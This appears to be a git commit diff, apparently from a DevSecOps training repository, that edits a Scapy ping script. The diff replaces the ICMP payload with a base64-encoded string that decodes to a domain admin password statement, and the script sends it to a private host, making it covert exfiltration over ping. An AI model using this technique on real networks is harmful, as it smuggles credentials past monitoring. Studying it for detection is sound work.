29626e7dfa51ee08a084783978a99ffaa0a2fa71
devsecops101 <62809843+devsecops101@users.noreply.github.com>
2023-09-24 07:49:12 +0100

    Update pingit.py

--- pingit.py
+++ pingit.py
@@ -1,3 +1,3 @@
 from scapy.all import IP, ICMP, send, srloop
-pingit = IP(dst="172.31.24.10")/ICMP()/"Hello"
+pingit = IP(dst="172.31.24.10")/ICMP()/"VGhpcyBpcyB0aGUgZG9tYWluIGFkbWluIHBhc3N3b3JkOiBnczJKODJ5dVVrc24xMkQ=="
 response = srloop(pingit)
